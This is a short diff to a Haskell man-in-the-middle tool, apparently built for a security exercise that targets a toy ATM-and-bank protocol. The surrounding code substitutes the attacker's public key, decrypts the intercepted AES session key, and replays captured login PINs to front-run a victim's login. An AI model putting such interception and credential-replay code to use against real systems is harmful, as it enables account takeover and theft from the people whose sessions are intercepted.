@@ -122,7 +122,7 @@ mitmHandshake atm bank logTo logFrom = do
     --print mitmPub
     let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
     let pubEncrypt = fmap (either (error . show) id) . encrypt (defaultOAEPParams SHA1) bankPub'
-    print bankPub'
+    --print bankPub'
     B.hPut atm (encodeX509Pubkey mitmPub)
     encAES <- B.hGetSome atm bufferSize
     let rawAES = mitmDecrypt encAES
@@ -355,7 +355,7 @@ doMitm bankPort active (atm, host, atmPort) = do
     let logFrom = log (unPort bankPort) atmPort  :: B.ByteString -> IO B.ByteString
     --dumbProxy atm bank logTo logFrom
     let intercept action = if not active then return () else do
-        when (actCmd action == Login && B.length (actPin action) > 0) $ do
+        when (actCmd action == Login && B.length (actPin action) > 0 && actUser action /= "Eve") $ do
             frontRunLogin bankPort (actUser action) (actPin action)
     (aes, aesIV) <- mitmHandshake atm bank logTo logFrom
     passiveMitm atm bank logTo logFrom aes aesIV intercept
